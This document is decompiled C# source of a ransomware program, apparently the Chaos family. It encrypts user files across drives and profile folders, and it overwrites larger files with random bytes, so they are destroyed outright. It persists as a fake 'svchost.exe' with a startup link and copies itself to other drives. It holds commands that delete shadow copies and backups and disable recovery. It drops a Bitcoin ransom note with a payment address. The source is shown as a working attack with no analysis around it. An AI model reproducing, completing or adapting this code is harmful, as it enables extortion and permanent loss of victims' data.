using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002058 File Offset: 0x00000258
		private static void Main(string[] args)
		{
			if (Program.AlreadyRunning())
			{
				Environment.Exit(1);
			}
			if (Program.checkSleep)
			{
				Program.sleepOutOfTempFolder();
			}
			if (Program.checkAdminPrivilage)
			{
				Program.copyResistForAdmin(Program.processName);
			}
			else if (Program.checkCopyRoaming)
			{
				Program.copyRoaming(Program.processName);
			}
			if (Program.checkStartupFolder)
			{
				Program.addLinkToStartup();
			}
			Program.lookForDirectories();
			if (Program.checkAdminPrivilage)
			{
				if (Program.checkdeleteShadowCopies)
				{
					Program.deleteShadowCopies();
				}
				if (Program.checkdisableRecoveryMode)
				{
					Program.disableRecoveryMode();
				}
				if (Program.checkdeleteBackupCatalog)
				{
					Program.deleteBackupCatalog();
				}
			}
			if (Program.checkSpread)
			{
				Program.spreadIt(Program.spreadName);
			}
			Program.addAndOpenNote();
			new Thread(delegate
			{
				Program.Run();
			}).Start();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x0000211B File Offset: 0x0000031B
		public static void Run()
		{
			Application.Run(new driveNotification.NotificationForm());
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002128 File Offset: 0x00000328
		private static void sleepOutOfTempFolder()
		{
			string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if (directoryName != folderPath)
			{
				Thread.Sleep(Program.sleepTextbox * 1000);
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002168 File Offset: 0x00000368
		private static bool AlreadyRunning()
		{
			Process[] processes = Process.GetProcesses();
			Process currentProcess = Process.GetCurrentProcess();
			foreach (Process process in processes)
			{
				try
				{
					if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
					{
						return true;
					}
				}
				catch (Exception)
				{
				}
			}
			return false;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000021EC File Offset: 0x000003EC
		public static byte[] random_bytes(int length)
		{
			Random random = new Random();
			length++;
			byte[] array = new byte[length];
			random.NextBytes(array);
			return array;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002214 File Offset: 0x00000414
		public static string RandomString(int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char c = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(c);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002264 File Offset: 0x00000464
		public static string RandomStringForExtension(int length)
		{
			if (Program.encryptedFileExtension == "")
			{
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = 0; i < length; i++)
				{
					char c = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
					stringBuilder.Append(c);
				}
				return stringBuilder.ToString();
			}
			return Program.encryptedFileExtension;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000022C8 File Offset: 0x000004C8
		public static string Base64EncodeString(string plainText)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(plainText);
			return Convert.ToBase64String(bytes);
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000022E8 File Offset: 0x000004E8
		public static string randomEncode(string plainText)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(plainText);
			return string.Concat(new string[]
			{
				"<EncyptedKey>",
				Program.Base64EncodeString(Program.RandomString(41)),
				"<EncyptedKey> ",
				Program.RandomString(2),
				Convert.ToBase64String(bytes)
			});
		}

		// Token: 0x0600000A RID: 10 RVA: 0x0000235C File Offset: 0x0000055C
		private static void encryptDirectory(string location)
		{
			try
			{
				string[] files = Directory.GetFiles(location);
				bool flag = true;
				for (int i = 0; i < files.Length; i++)
				{
					try
					{
						string extension = Path.GetExtension(files[i]);
						string fileName = Path.GetFileName(files[i]);
						if (Array.Exists<string>(Program.validExtensions, (string E) => E == extension.ToLower()) && fileName != Program.droppedMessageTextbox)
						{
							FileInfo fileInfo = new FileInfo(files[i]);
							fileInfo.Attributes = FileAttributes.Normal;
							if (fileInfo.Length < 1098576L)
							{
								if (Program.encryptionAesRsa)
								{
									Program.EncryptFile(files[i]);
								}
							}
							else if (fileInfo.Length > 200000000L)
							{
								Random random = new Random();
								int num = random.Next(200000000, 300000000);
								string @string = Encoding.UTF8.GetString(Program.random_bytes(num));
								File.WriteAllText(files[i], Program.randomEncode(@string));
								File.Move(files[i], files[i] + "." + Program.RandomStringForExtension(4));
							}
							else
							{
								string string2 = Encoding.UTF8.GetString(Program.random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
								File.WriteAllText(files[i], Program.randomEncode(string2));
								File.Move(files[i], files[i] + "." + Program.RandomStringForExtension(4));
							}
							if (flag)
							{
								flag = false;
								File.WriteAllLines(location + "/" + Program.droppedMessageTextbox, Program.messages);
							}
						}
					}
					catch
					{
					}
				}
				string[] directories = Directory.GetDirectories(location);
				for (int j = 0; j < directories.Length; j++)
				{
					Program.encryptDirectory(directories[j]);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002540 File Offset: 0x00000740
		public static string rsaKey()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
			stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
			stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
			stringBuilder.AppendLine("  <Modulus>qPuvdrhAn4/gWCHbjEt3rlvU0L1JbOF/RvoanuRDb3njN6+B/Cj8vir+ZPfuJbnQXUclstQ6w0Golksi4Zic6lyYlP0s9jPGXeq5x2fzdRatumfiWIuuaUlzeUqArEXQlrG3UNVIJo9XHRhLJC5Kzwv3sb8yWVjQx7ropOx5AOk=</Modulus>");
			stringBuilder.AppendLine("</RSAParameters>");
			return stringBuilder.ToString();
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002598 File Offset: 0x00000798
		public static string CreatePassword(int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			while (0 < length--)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000025F0 File Offset: 0x000007F0
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] array = null;
			byte[] array2 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, array2, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
						cryptoStream.Close();
					}
					array = memoryStream.ToArray();
				}
			}
			return array;
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000026EC File Offset: 0x000008EC
		public static void EncryptFile(string file)
		{
			byte[] array = File.ReadAllBytes(file);
			string text = Program.CreatePassword(20);
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			byte[] array2 = Program.AES_Encrypt(array, bytes);
			File.WriteAllText(file, "<EncryptedKey>" + Program.RSAEncrypt(text, Program.rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(array2));
			File.Move(file, file + "." + Program.RandomStringForExtension(4));
		}

		// Token: 0x0600000F RID: 15 RVA: 0x0000275C File Offset: 0x0000095C
		public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
			string text2;
			using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(1024))
			{
				try
				{
					rsacryptoServiceProvider.FromXmlString(publicKeyString.ToString());
					byte[] array = rsacryptoServiceProvider.Encrypt(bytes, true);
					string text = Convert.ToBase64String(array);
					text2 = text;
				}
				finally
				{
					rsacryptoServiceProvider.PersistKeyInCsp = false;
				}
			}
			return text2;
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000027D4 File Offset: 0x000009D4
		private static void lookForDirectories()
		{
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (driveInfo.ToString() != "C:\\")
				{
					Program.encryptDirectory(driveInfo.ToString());
				}
			}
			string text = Program.userDir + Program.userName + "\\Desktop";
			string text2 = Program.userDir + Program.userName + "\\Links";
			string text3 = Program.userDir + Program.userName + "\\Contacts";
			string text4 = Program.userDir + Program.userName + "\\Desktop";
			string text5 = Program.userDir + Program.userName + "\\Documents";
			string text6 = Program.userDir + Program.userName + "\\Downloads";
			string text7 = Program.userDir + Program.userName + "\\Pictures";
			string text8 = Program.userDir + Program.userName + "\\Music";
			string text9 = Program.userDir + Program.userName + "\\OneDrive";
			string text10 = Program.userDir + Program.userName + "\\Saved Games";
			string text11 = Program.userDir + Program.userName + "\\Favorites";
			string text12 = Program.userDir + Program.userName + "\\Searches";
			string text13 = Program.userDir + Program.userName + "\\Videos";
			Program.encryptDirectory(text);
			Program.encryptDirectory(text2);
			Program.encryptDirectory(text3);
			Program.encryptDirectory(text4);
			Program.encryptDirectory(text5);
			Program.encryptDirectory(text6);
			Program.encryptDirectory(text7);
			Program.encryptDirectory(text8);
			Program.encryptDirectory(text9);
			Program.encryptDirectory(text10);
			Program.encryptDirectory(text11);
			Program.encryptDirectory(text12);
			Program.encryptDirectory(text13);
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002994 File Offset: 0x00000B94
		private static void copyRoaming(string processName)
		{
			string friendlyName = AppDomain.CurrentDomain.FriendlyName;
			string location = Assembly.GetExecutingAssembly().Location;
			Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
			string text2 = text + processName;
			if (friendlyName != processName || location != text2)
			{
				if (!File.Exists(text2))
				{
					File.Copy(friendlyName, text2);
					ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
					processStartInfo.WorkingDirectory = text;
					if (new Process
					{
						StartInfo = processStartInfo
					}.Start())
					{
						Environment.Exit(1);
						return;
					}
				}
				else
				{
					try
					{
						File.Delete(text2);
						Thread.Sleep(200);
						File.Copy(friendlyName, text2);
					}
					catch
					{
					}
					ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
					processStartInfo2.WorkingDirectory = text;
					if (new Process
					{
						StartInfo = processStartInfo2
					}.Start())
					{
						Environment.Exit(1);
					}
				}
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002A9C File Offset: 0x00000C9C
		private static void copyResistForAdmin(string processName)
		{
			string friendlyName = AppDomain.CurrentDomain.FriendlyName;
			string location = Assembly.GetExecutingAssembly().Location;
			Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
			string text2 = text + processName;
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2)
			{
				UseShellExecute = true,
				Verb = "runas",
				WindowStyle = ProcessWindowStyle.Normal,
				WorkingDirectory = text
			};
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (friendlyName != processName || location != text2)
			{
				if (!File.Exists(text2))
				{
					File.Copy(friendlyName, text2);
					try
					{
						Process.Start(processStartInfo);
						Environment.Exit(1);
						return;
					}
					catch (Win32Exception ex)
					{
						if (ex.NativeErrorCode == 1223)
						{
							Program.copyResistForAdmin(processName);
						}
						return;
					}
				}
				try
				{
					File.Delete(text2);
					Thread.Sleep(200);
					File.Copy(friendlyName, text2);
				}
				catch
				{
				}
				try
				{
					Process.Start(processStartInfo);
					Environment.Exit(1);
				}
				catch (Win32Exception ex2)
				{
					if (ex2.NativeErrorCode == 1223)
					{
						Program.copyResistForAdmin(processName);
					}
				}
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002BEC File Offset: 0x00000DEC
		private static void addLinkToStartup()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
			string text = Process.GetCurrentProcess().ProcessName;
			using (StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url"))
			{
				string location = Assembly.GetExecutingAssembly().Location;
				streamWriter.WriteLine("[InternetShortcut]");
				streamWriter.WriteLine("URL=file:///" + location);
				streamWriter.WriteLine("IconIndex=0");
				string text2 = location.Replace('\\', '/');
				streamWriter.WriteLine("IconFile=" + text2);
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002C90 File Offset: 0x00000E90
		private static void addAndOpenNote()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.droppedMessageTextbox;
			try
			{
				File.WriteAllLines(text, Program.messages);
				Thread.Sleep(500);
				Process.Start(text);
			}
			catch
			{
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002CE8 File Offset: 0x00000EE8
		private static void registryStartup()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
				registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
			}
			catch
			{
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002D30 File Offset: 0x00000F30
		private static void spreadIt(string spreadName)
		{
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
				{
					try
					{
						File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002DAC File Offset: 0x00000FAC
		private static void runCommand(string commands)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/C " + commands,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			process.Start();
			process.WaitForExit();
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002DFC File Offset: 0x00000FFC
		private static void deleteShadowCopies()
		{
			Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002E08 File Offset: 0x00001008
		private static void disableRecoveryMode()
		{
			Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002E14 File Offset: 0x00001014
		private static void deleteBackupCatalog()
		{
			Program.runCommand("wbadmin delete catalog -quiet");
		}

		// Token: 0x04000001 RID: 1
		private static string userName = Environment.UserName;

		// Token: 0x04000002 RID: 2
		private static string userDir = "C:\\Users\\";

		// Token: 0x04000003 RID: 3
		public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

		// Token: 0x04000004 RID: 4
		public static bool encryptionAesRsa = true;

		// Token: 0x04000005 RID: 5
		public static string encryptedFileExtension = "";

		// Token: 0x04000006 RID: 6
		private static bool checkSpread = true;

		// Token: 0x04000007 RID: 7
		private static string spreadName = "surprise.exe";

		// Token: 0x04000008 RID: 8
		private static bool checkCopyRoaming = true;

		// Token: 0x04000009 RID: 9
		private static string processName = "svchost.exe";

		// Token: 0x0400000A RID: 10
		private static bool checkStartupFolder = true;

		// Token: 0x0400000B RID: 11
		private static bool checkSleep = false;

		// Token: 0x0400000C RID: 12
		private static int sleepTextbox = 10;

		// Token: 0x0400000D RID: 13
		public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

		// Token: 0x0400000E RID: 14
		private static string droppedMessageTextbox = "read_it.txt";

		// Token: 0x0400000F RID: 15
		private static bool checkAdminPrivilage = false;

		// Token: 0x04000010 RID: 16
		private static bool checkdeleteShadowCopies = false;

		// Token: 0x04000011 RID: 17
		private static bool checkdisableRecoveryMode = false;

		// Token: 0x04000012 RID: 18
		private static bool checkdeleteBackupCatalog = false;

		// Token: 0x04000013 RID: 19
		public static string staticSplit = "bc";

		// Token: 0x04000014 RID: 20
		public static string appMutex = Program.staticSplit + Program.appMutexStartup + Program.appMutexRun;

		// Token: 0x04000015 RID: 21
		public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

		// Token: 0x04000016 RID: 22
		private static string[] messages = new string[]
		{
			"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
			"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
		};

		// Token: 0x04000017 RID: 23
		private static string[] validExtensions = new string[]
		{
			".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
			".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
			".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
			".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
			".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
			".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
			".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
			".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
			".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
			".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
			".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
			".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
			".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
			".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
			".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
			".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
			".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
			".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
			".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
			".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
			".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
			".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
			".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
		};

		// Token: 0x04000018 RID: 24
		private static Random random = new Random();

		// Token: 0x02000003 RID: 3
		public static class NativeMethods
		{
			// Token: 0x0600001E RID: 30
			[DllImport("user32.dll", SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool AddClipboardFormatListener(IntPtr hwnd);

			// Token: 0x0600001F RID: 31
			[DllImport("user32.dll", SetLastError = true)]
			public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

			// Token: 0x0400001A RID: 26
			public const int clp = 797;

			// Token: 0x0400001B RID: 27
			public static IntPtr intpreclp = new IntPtr(-3);
		}
	}
}
